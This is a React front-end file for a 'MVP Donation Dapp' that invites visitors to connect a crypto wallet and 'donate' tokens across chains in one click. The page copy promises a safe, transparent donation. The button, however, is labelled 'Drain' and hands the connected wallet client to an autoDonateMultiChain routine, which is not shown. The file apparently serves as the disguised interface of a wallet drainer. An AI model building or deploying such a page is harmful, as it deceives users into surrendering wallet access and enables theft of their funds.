

// src/App.jsx
import React, { useState } from "react";
import { autoDonateMultiChain } from "./engine/donate";

import Navbar from "./components/Navbar";
import PriceTicker from "./components/PriceTicker";
import GuideModal from "./components/GuideModal";
import Notifications from "./components/Notifications";
import Footer from "./components/Footer";
import Background from "./components/Background";

import { useAccount, useWalletClient } from "wagmi";

export default function App() {
  const [status, setStatus] = useState("idle");
  const [last, setLast] = useState(null);
  const [notifications, setNotifications] = useState([]);

  const { isConnected } = useAccount();
  const { data: walletClient } = useWalletClient();

  // helper for popup notifications
  function addNotification(message, type = "info") {
    const id = Date.now();
    setNotifications((prev) => [...prev, { id, message, type }]);
    setTimeout(() => {
      setNotifications((prev) => prev.filter((n) => n.id !== id));
    }, 5000);
  }

  async function handleDonate() {
    if (!walletClient) {
      addNotification("No connected wallet client found. Please connect your wallet.", "error");
      setLast({ success: false, reason: "No wallet client available." });
      setStatus("failed");
      return;
    }

    try {
      setStatus("running");
      addNotification("Donation started… 🚀", "info");

      const res = await autoDonateMultiChain(walletClient);
      setLast(res);

      if (res.success) {
        addNotification("Donation completed successfully 🎉", "success");
        setStatus("done");
      } else {
        addNotification(`Donation failed: ${res.reason}`, "error");
        setStatus("failed");
      }
    } catch (e) {
      console.error(e);
      setLast({ success: false, reason: e.message });
      addNotification(`Error: ${e.message}`, "error");
      setStatus("error");
    }
  }

return (
  <div style={{ display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center", paddingTop: "84px", placeContent: "center", marginLeft: "50%" }}>
    {/* Background layer */}
    <Background />

    {/* Navbar */}
    <Navbar />

    {/* Price ticker */}
    <div className="pt-[84px]">
      <PriceTicker />

      {/* Main content wrapper */}
      <div className="w-full flex justify-center">
        <main className="flex flex-col items-center gap-6 py-8 px-6 max-w-4xl">
          <h1 className="text-3xl sm:text-4xl md:text-5xl font-extrabold text-center leading-tight">
            MVP Donation Dapp
          </h1>

          <p className="text-gray-300 text-center text-sm sm:text-base max-w-xl">
            Donate your tokens across chains in one click — safe, fast, and transparent.
          </p>

          {/* How it Works + Donate */}
          <div className="w-full flex flex-col sm:flex-row items-center justify-center gap-4">
            <div className="flex-shrink-0">
              <GuideModal />
            </div>

            <div className="flex-shrink-0">
              {isConnected ? (
                <button
                  onClick={handleDonate}
                  disabled={status === "running"}
                  className="px-6 py-3 bg-blue-600 rounded-xl shadow-lg hover:bg-blue-700 transition disabled:opacity-50"
                >
                  {status === "running" ? "Processing…" : "Drain"}
                </button>
              ) : (
                <p className="text-gray-400 italic text-center">
                  🔌 Connect your wallet to see the donate button
                </p>
              )}
            </div>
          </div>

          {/* Status panel */}
          <div className="w-full bg-black/50 p-4 rounded-lg overflow-x-auto">
            <div className="flex items-start justify-between">
              <div>
                <strong>Status:</strong> <span className="ml-2">{status}</span>
              </div>
              <div className="text-xs text-gray-400">Dev output</div>
            </div>
            <pre className="mt-2 text-xs sm:text-sm whitespace-pre-wrap break-words">
              {JSON.stringify(last, null, 2)}
            </pre>
          </div>
        </main>
      </div>
      
 {/* Footer */}
      <div className="w-full flex justify-center">
        <div className="px-6 max-w-4xl w-full">
          <Footer />
        </div>
      </div>
      </div>
    {/* Notifications - positioned absolutely */}
    <Notifications notifications={notifications} />
  </div>
);
}
